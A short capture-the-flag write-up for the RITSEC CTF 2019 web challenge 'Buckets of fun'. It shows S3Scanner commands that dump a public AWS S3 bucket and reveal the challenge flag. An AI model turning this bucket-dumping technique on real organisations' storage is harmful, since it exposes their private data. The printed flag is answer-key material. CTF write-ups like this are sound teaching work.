# RITSEC CTF 2019 – Buckets of fun

* **Category:** web
* **Points:** 100

## Challenge

> http://bucketsoffun-ctf.s3-website-us-east-1.amazonaws.com/
> 
> Author: scriptingislife

## Solution

The title of the challenge is a hint to insecure/public AWS S3 buckets, so [S3Scanner](https://github.com/sa7mon/S3Scanner) can be used to easily dump the content.

```
root@m3ss4p0:~# git clone https://github.com/sa7mon/S3Scanner.git
root@m3ss4p0:~# cd S3Scanner/
root@m3ss4p0:~/S3Scanner# chmod u+x s3scanner.py
root@m3ss4p0:~/S3Scanner# pip install -r requirements.txt 
root@m3ss4p0:~/S3Scanner# python3 ./s3scanner.py --dump bucketsoffun-ctf.s3-website-us-east-1.amazonaws.com
root@m3ss4p0:~/S3Scanner# cd buckets/bucketsoffun-ctf/
root@m3ss4p0:~/S3Scanner/buckets/bucketsoffun-ctf# ll
totale 8
-rw-r--r-- 1 root root 630 nov 16 09:15 index.html
-rw-r--r-- 1 root root  25 nov 16 09:15 youfoundme-asd897kjm.txt
root@m3ss4p0:~/S3Scanner/buckets/bucketsoffun-ctf# cat youfoundme-asd897kjm.txt
RITSEC{LIST_HIDDEN_FILES}
```

The flag is the following.
```
RITSEC{LIST_HIDDEN_FILES}
```